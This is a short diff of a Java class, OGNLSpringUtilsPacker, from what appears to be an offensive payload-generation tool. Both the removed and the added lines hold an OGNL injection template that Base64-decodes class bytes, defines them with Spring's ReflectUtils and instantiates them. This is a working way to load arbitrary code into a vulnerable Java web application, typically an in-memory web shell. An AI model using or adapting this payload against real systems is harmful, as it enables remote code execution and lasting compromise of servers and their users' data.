@@ -8,7 +8,7 @@ import com.reajason.javaweb.packer.Packer;
  * @since 2025/7/7
  */
 public class OGNLSpringUtilsPacker implements Packer {
-    String template = "@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}'),@java.lang.Thread@currentThread().getContextClassLoader(),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser')).newInstance()";
+    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}'),@java.lang.Thread@currentThread().getContextClassLoader())).newInstance()";
 
     @Override
     public String pack(ClassPackerConfig config) {
